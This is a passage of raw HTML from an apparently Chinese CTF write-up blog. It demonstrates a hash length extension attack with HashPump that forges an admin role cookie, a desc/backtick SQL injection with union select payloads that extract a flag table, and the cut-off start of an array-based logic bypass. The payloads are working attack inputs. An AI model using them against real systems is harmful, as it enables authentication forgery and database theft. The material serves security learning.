data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>但是如MD5,SHA1,<br>SHA2等，都是基于Merkle–Damgård结构，而这类算法的问题在于：如果你知道加密前的原文，和加密后的密文，只需要再知道盐值的长度，就能在原文后面添加信息并计算出相应的密文。</p></blockquote>\n<p>盐值在前，原文在后，可以用hash长度扩展攻击。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>预测得到的是：<br>md5（盐+原文+填充+恶意扩充）</p></blockquote>\n<p>哈希长度扩展攻击我们通常使用HashPump进行利用</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。</p></blockquote>\n<p>安装过程如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/bwall/HashPump</span>\napt<span class=\"token operator\">-</span>get install g<span class=\"token operator\">++</span> libssl<span class=\"token operator\">-</span>dev\ncd HashPump\nmake\nmake install<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话我们抓包看一下初始的hsh和role的值<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528972.png\" alt=\"在这里插入图片描述\"><br>role的值为<code>s:5:&quot;guest&quot;;</code>,hah的值为<code>3a4727d57463f122833d9e732f94e4e0</code><br>这里还利用到反序列化的一个特点，就是用unserialize函数时，后面的内容会被忽略，不进行反序列化，示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'s:5:\"admin\";  s:5:\"guest\";'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528095.png\" alt=\"在这里插入图片描述\"><br>这个就是攻击关键<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528889.png\" alt=\"在这里插入图片描述\"><br>具体内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">root@<span class=\"token constant\">VM</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span>ubuntu<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>HashPump<span class=\"token comment\">#  hashpump</span>\nInput Signature<span class=\"token punctuation\">:</span>  <span class=\"token number\">3</span>a4727d57463f122833d9e732f94e4e0\nInput Data<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">;</span><span class=\"token string double-quoted-string\">\"tseug\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>s\nInput Key Length<span class=\"token punctuation\">:</span> <span class=\"token number\">12</span>\nInput Data to Add<span class=\"token punctuation\">:</span> <span class=\"token operator\">^</span><span class=\"token constant\">C</span>\nroot@<span class=\"token constant\">VM</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token operator\">-</span>ubuntu<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>HashPump<span class=\"token comment\">#  hashpump</span>\nInput Signature<span class=\"token punctuation\">:</span>  <span class=\"token number\">3</span>a4727d57463f122833d9e732f94e4e0\nInput Data<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">;</span><span class=\"token string double-quoted-string\">\"tseug\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>s\nInput Key Length<span class=\"token punctuation\">:</span> <span class=\"token number\">12</span>\nInput Data to Add<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">;</span><span class=\"token string double-quoted-string\">\"nimda\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>s\nfcdc3840332555511c4e4323f6decb07\n<span class=\"token punctuation\">;</span><span class=\"token string double-quoted-string\">\"tseug\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>s\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00<span class=\"token punctuation\">;</span><span class=\"token string double-quoted-string\">\"nimda\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>s<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>长度12是测试出来的，可以得到数据后进行逆序反转，同时将\\x00换成%00发包，看结果是否回显flag进行测试<br>最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">role<span class=\"token operator\">=</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span>c0<span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">80</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"guest\"</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span class=\"token punctuation\">;</span>hsh<span class=\"token operator\">=</span>fcdc3840332555511c4e4323f6decb07<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528818.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"desc与反引号引发的SQL注入\"><a href=\"#desc与反引号引发的SQL注入\" class=\"headerlink\" title=\"desc与反引号引发的SQL注入\"></a>desc与反引号引发的SQL注入</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$table</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'table'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'table'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$table</span> <span class=\"token operator\">=</span> <span class=\"token function\">Filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$table</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"desc `secret_<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$table</span><span class=\"token punctuation\">&#125;</span></span>`\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token function\">Hacker</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select 'flag&#123;xxx&#125;' from secret_<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$table</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ret</span> <span class=\"token operator\">=</span> <span class=\"token function\">sql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>原题环境如下<br><a href=\"http://web.jarvisoj.com:32794/\">http://web.jarvisoj.com:32794/</a><br>简单看一下代码，get传值table，然后有过滤，接下来就是desc这个语句，而后查询SQL语句，取出结果。<br>常见的desc是用来查表的结构的，其使用方法是desc+表名，本地测试如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> desc users<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">Field</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">Type</span>        <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">Null</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Key</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">Default</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Extra</span>          <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span>       <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>      <span class=\"token operator\">|</span> <span class=\"token class-name\">NO</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">PRI</span> <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">auto_increment</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">NO</span>   <span class=\"token operator\">|</span>     <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span>    <span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">NO</span>   <span class=\"token operator\">|</span>     <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span>    <span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">3</span> rows in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.01</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>当desc和反引号结合使用时</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">desc users xxx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回空</span>\ndesc <span class=\"token string backtick-quoted-string\">`users`</span> <span class=\"token string backtick-quoted-string\">`xxx`</span>； <span class=\"token comment\">//返回空</span>\ndesc <span class=\"token string single-quoted-string\">'users'</span> <span class=\"token string single-quoted-string\">'xxx'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//报错</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时我们的语句就可以针对</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"desc `secret_<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$table</span><span class=\"token punctuation\">&#125;</span></span>`\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token function\">Hacker</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>进行绕过，我们构造table为<code>test``xxx</code>，此时结果为<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528062.png\" alt=\"在这里插入图片描述\"><br>没有执行hacker()函数，说明成功绕过，此时我们再利用这个方式来进行联合查询即可<br>查库</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">table<span class=\"token operator\">=</span>test<span class=\"token string backtick-quoted-string\">` `</span>union select <span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> limit <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528085.png\" alt=\"在这里插入图片描述\"><br>查表</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">table<span class=\"token operator\">=</span>test<span class=\"token string backtick-quoted-string\">` `</span>union select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>distinct table_name<span class=\"token punctuation\">)</span> from \ninformation_schema<span class=\"token operator\">.</span>columns where table_schema<span class=\"token operator\">=</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> limit <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528140.png\" alt=\"在这里插入图片描述\"><br>查列</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">table<span class=\"token operator\">=</span>test<span class=\"token string backtick-quoted-string\">` `</span>union select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>distinct column_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>columns where table_name<span class=\"token operator\">=</span><span class=\"token number\">0x7365637265745f666c6167</span> limit <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528518.png\" alt=\"在这里插入图片描述\"><br>查字段</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">table<span class=\"token operator\">=</span>test<span class=\"token string backtick-quoted-string\">` `</span>union select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>flagUwillNeverKnow<span class=\"token punctuation\">)</span> from secret_flag limit <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528893.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"利用提交数组绕过逻辑\"><a href=\"#利用提交数组绕过逻辑\" class=\"headerlink\" title=\"利用提交数组绕过逻辑\"></a>利用提交数组绕过逻辑</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$role</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"guest\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag&#123;test_flag&#125;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$auth</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$role</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 